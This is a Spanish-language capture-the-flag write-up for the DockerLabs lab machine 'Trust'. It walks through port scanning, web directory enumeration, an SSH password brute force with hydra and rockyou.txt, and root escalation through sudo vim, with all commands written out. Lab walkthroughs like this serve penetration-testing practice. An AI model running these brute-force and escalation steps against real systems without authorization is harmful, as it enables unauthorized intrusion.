# 🖥️ Trust - DockerLabs

> **Dificultad:** Media  
> **OS:** Debian  
> **IP:** 172.19.0.2  
> **Fecha:** 2026-04-13

---

## 📡 Reconocimiento

```bash
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -vv -Pn 172.19.0.2
```

**Puertos abiertos:**
| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 9.2p1 Debian |
| 80/tcp | HTTP | Apache 2.4.57 (Debian) |

- Página por defecto de Apache

---

## 🌐 Enumeración Web

```bash
gobuster dir -u http://172.19.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

**Resultado:**
- `secret.php` (200) → mensaje "Hola Mario" → **usuario: mario**

---

## 🔓 Acceso inicial — Fuerza bruta SSH

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt ssh://172.19.0.2
```

**Credenciales encontradas:** `mario / chocolate` — en 7 segundos

```bash
ssh mario@172.19.0.2
```

---

## ⬆️ Escalada de privilegios — vim sudo

```bash
sudo -l
# (ALL) /usr/bin/vim
```

**vim con sudo = shell root directa** via GTFOBins:

```bash
sudo vim -c ':!/bin/bash'
whoami  # root
```

> Ver [GTFOBins - vim](https://gtfobins.github.io/gtfobins/vim/#sudo)

---

## 📝 Lecciones aprendidas

- Páginas PHP con mensajes aparentemente inútiles pueden revelar usuarios del sistema
- **vim con sudo** es una de las escaladas más comunes y directas — siempre buscar en GTFOBins
- Contraseñas simples como `chocolate` aparecen muy pronto en rockyou.txt
- Esta máquina es ideal para practicar el flujo básico: enumeración → fuerza bruta → sudo -l → GTFOBins
